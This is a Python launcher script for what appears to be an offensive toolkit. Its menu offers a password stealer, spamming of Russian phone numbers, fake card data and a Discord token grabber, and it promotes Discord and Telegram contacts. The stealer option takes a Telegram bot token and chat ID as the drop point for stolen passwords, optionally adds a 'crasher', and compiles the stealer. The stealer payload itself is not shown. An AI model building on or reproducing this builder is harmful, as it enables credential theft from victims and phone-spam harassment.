import os
from spamphone import spaming
from fake_data import fake


print('''
dsc.gg/vfamily
if error - TG @Benz_159
''')

print('''
[1 - Stealer][1.1 - QNA Stealer]
[2 - Spamming russia phone]
[3 - Fake Data]
[4 - Discord Token Grabber]
''')
def Stealer():
    os.system('cls')
    print('creater stealer - https://t.me/+fN7NR-nVvmsxYWRi')
    vib = input('to use configs which were used? (if there is no config, then passwords will not be sent) (y)> ')
    if vib == 'y':
        YN = input('Add a crusher to a stealer? (y) >')
        if YN == 'y':
            crasher = open('stealer/crasher.py', 'w+')
            crasher.write(f'crash = "{YN}"')
            print('starting compiter.bat')
            os.system('start stealer\compiter.bat')
        else:
            print('starting compiter.bat')
            os.system('start stealer\compiter.bat')
    else:
        token = input('TOKEN >')
        chat_id = input('CHAT_ID >')
        file_data = open('stealer/settings.py', 'w+')
        file_data.write(f'''
token = "{token}"
chat_id = "{chat_id}"
''')
    
        YN = input('Add a crusher to a stealer? (y) >')
        if YN == 'y':
            crasher = open('stealer/crasher.py', 'w+')
            crasher.write(f'crash = "{YN}"')
            print('starting compiter.bat')
            os.system('start stealer\compiter.bat')
        else:
            print('starting compiter.bat')
            os.system('start stealer\compiter.bat')
def Spam():
    print('[Spam Phone]')
    spaming.MAIN()
A = input('>')
if A == '1':
    Stealer()
elif A == '1.1':
    os.system('start stealer/readStiller.txt')
elif A == '2':
    Spam()
elif A == '3':
    fake.card()
    print('create data.txt')
    print('face - https://thispersondoesnotexist.com/')
    os.system('python setup.py')
elif A == '4':
    None